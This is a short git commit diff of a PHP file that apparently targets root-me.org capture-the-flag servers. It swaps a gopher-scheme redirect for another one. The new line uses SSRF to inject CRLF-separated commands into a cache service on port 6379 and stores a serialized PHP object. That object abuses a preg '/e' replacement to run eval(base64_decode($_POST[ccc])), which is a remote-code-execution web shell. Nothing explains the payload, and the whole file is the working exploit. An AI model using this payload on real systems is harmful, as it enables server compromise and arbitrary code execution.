35a68c142bcda1fa592cb9b0f9d1924eefde7ffd
M <M-Land@users.noreply.github.com>
2019-01-13 18:11:04 +0100

    Update my.php

--- my.php
+++ my.php
@@ -1,3 +1,3 @@
 <?php
-header("Location: gopher://ctf04.root-me.org:6379/_CONFIG%20GET%20maxmemory");
+    header('Location: gopher://ctf09.root-me.org:6379/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a');
 ?>
